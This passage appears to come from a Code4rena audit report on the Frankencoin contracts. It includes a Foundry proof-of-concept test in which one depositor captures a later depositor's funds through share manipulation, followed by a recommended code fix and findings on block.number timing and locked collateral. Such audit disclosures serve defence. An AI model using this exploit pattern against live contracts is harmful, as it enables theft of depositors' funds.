class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/Test.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../contracts/Frankencoin.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ShareManipulation_POC</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Test</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Frankencoin</span><span class=\"mtk1\"> </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Equity</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BOB</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Setup contracts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Frankencoin</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Equity</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">reserve</span><span class=\"mtk1\">()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Give both ALICE and BOB 1000 Frankencoin</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">suggestMinter</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BOB</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_NextDepositorGetsOneShare</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ALICE deposits 1000 Frankencoin, getting 1000e18 shares</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferAndCall</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Time passes until ALICE can redeem</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">90</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">7200</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ALICE redeems 1 share, leaving 1000e18 - 1 shares remaining</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// BOB deposits 1000 Frankencoin, but gets only 1 share</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BOB</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferAndCall</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BOB</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// All of BOB&#39;s deposited Frankencoin accrue to ALICE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">) - </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertGt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ALICE</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1999</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>As the total amount of shares will never be less than <code>1e18</code>, check if <code>totalShares</code> is less than <code>1e18</code> instead of <code>1000e18</code> in <code>calculateSharesInternal()</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L266-L270\">Equity.sol#L266-L270</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function calculateSharesInternal(uint256 capitalBefore, uint256 investment) internal view returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 totalShares = totalSupply();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-         uint256 newTotalShares = totalShares &lt; 1000 * ONE_DEC18 ? 1000 * ONE_DEC18 : _mulD18(totalShares, _cubicRoot(_divD18(capitalBefore + investment, capitalBefore)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+         uint256 newTotalShares = totalShares &lt; ONE_DEC18 ? 1000 * ONE_DEC18 : _mulD18(totalShares, _cubicRoot(_divD18(capitalBefore + investment, capitalBefore)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return newTotalShares - totalShares;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p>This would give <code>1000e18</code> shares to the initial depositor and ensure that subsequent depositors will never receive a disproportionate amount of shares.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/915#issuecomment-1519790248\">0xA5DF (lookout) commented</a>:</strong></p>\n<blockquote>\n<p>Similar to <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/983\"><code>#983</code></a>, yet different.</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/880\"><code>#880</code></a> describes a similar issue except that the lowering of shares is due to restructure, duping to this one.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/915#issuecomment-1528895861\">luziusmeisser (Frankencoin) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>In theory, this is possible. In practice, I assume the number of shares to always be significantly above 1000 and this issue not to be of practical relevance.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/915#issuecomment-1551893812\">hansfried (judge) decreased severity to Medium</a></strong></p>\n<hr>\n<h2 id=\"m-04-anchortime-will-not-work-properly-on-optimism-due-to-use-of-blocknumber\" style=\"position:relative;\"><a href=\"#m-04-anchortime-will-not-work-properly-on-optimism-due-to-use-of-blocknumber\" aria-label=\"m 04 anchortime will not work properly on optimism due to use of blocknumber permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/914\">[M-04] <code>anchorTime()</code> will not work properly on Optimism due to use of <code>block.number</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/914\">peakbolt</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/865\">Udsen</a> and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/511\">Tricko</a></em></p>\n<p>When deploying to Optimism, Equity.anchorTime() will not be accurate due to the use of block.number.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function anchorTime() internal view returns (uint64){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return uint64(block.number &lt;&lt; BLOCK_TIME_RESOLUTION_BITS);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The inaccuracy of block.number will affect the computation of the holding duration for the votes. That will affect redeem() as the issue will cause it to deviate from the intended design of 90 days minimum holding duration (stated in comments).</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L54-L59\">https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L54-L59</a></p>\n<h3 id=\"detailed-explanation\" style=\"position:relative;\"><a href=\"#detailed-explanation\" aria-label=\"detailed explanation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Detailed Explanation</h3>\n<p>Noted that the devs have mentioned that it is conceivable that Frankencoin will be deployed on other evm chains. So it is worth reviewing the use of block.number, such that it is compatible with other chains like Optimism.</p>\n<p>On Optimism, the <code>block.number</code> is not a reliable source of timing information and the time between each block is also different from Ethereum. This is because each transaction on L2 is placed in a separate block and blocks are not produce at a constant rate. This will cause the holding duration computation using <code>anchorTime()</code> to fluctuate. (see Optimism docs <a href=\"https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps\">https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps</a>)</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using block.timestamp instead of block.number for more accurate measurement of time.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/914#issuecomment-1528873356\">luziusmeisser (Frankencoin) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>I guess I should switch from block number to timestamp.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-owner-of-denied-position-is-not-able-to-withdraw-collateral-until-expiry\" style=\"position:relative;\"><a href=\"#m-05-owner-of-denied-position-is-not-able-to-withdraw-collateral-until-expiry\" aria-label=\"m 05 owner of denied position is not able to withdraw collateral until expiry permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/874\">[M-05] Owner of Denied Position is not able to withdraw collateral until expiry</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/874\">yellowBirdy</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/803\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/732\">Norah</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/612\">ChrisTina</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/568\">BenRai</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/366\">GreedyGoblin</a></em></p>\n<h3 id=\"lines-of-code-2\" style=\"position:relative;\"><a href=\"#lines-of-code-2\" aria-label=\"lines of code 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L112\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L112</a> <br><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L263\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L263</a> <br><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L373-L376\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L373-L376</a></p>\n<h3 id=\"vulnerability-details\" style=\"position:relative;\"><a href=\"#vulnerability-details\" aria-label=\"vulnerability details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability details</h3>\n<p>Denying a position puts it into perma cooldown state ie. cooldown ends at expiry. It’s impossible to withdraw collateral in the cooldown state.</p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Locks owner funds until expiry, expiry time is not capped and can be expected to be long. There is no benefit to the owner to set it shorter and be forced to repay the position at an inconvenient time. Hence a high risk exists to lock the collateral semi permanently</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider owner trying to call <code>withdrawCollateral</code> on a denied position</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function deny(address[] calldata helpers, string calldata message) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (block.timestamp &gt;= start) revert TooLate();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IReserve(zchf.reserve()).checkQualified(msg.sender, helpers);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cooldown = expiration; // since expiration is immutable, we put it under cooldown until the end</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit PositionDenied(msg.sender, message);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function withdrawCollateral(address target, uint256 amount) public onlyOwner noChallenge noCooldown {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 balance = internalWithdrawCollateral(target, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        checkCollateral(balance, price);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    modifier noCooldown() {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (block.timestamp &lt;= cooldown) revert Hot();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<ol>\n<li>Successful call all to <code>deny</code> will set <code>cooldown = expiry</code></li>\n<li>Subsequent call to <code>withdrawCollateral</code> will be reverted by <code>noCooldown</code> modifier</li>\n</ol>\n<h3 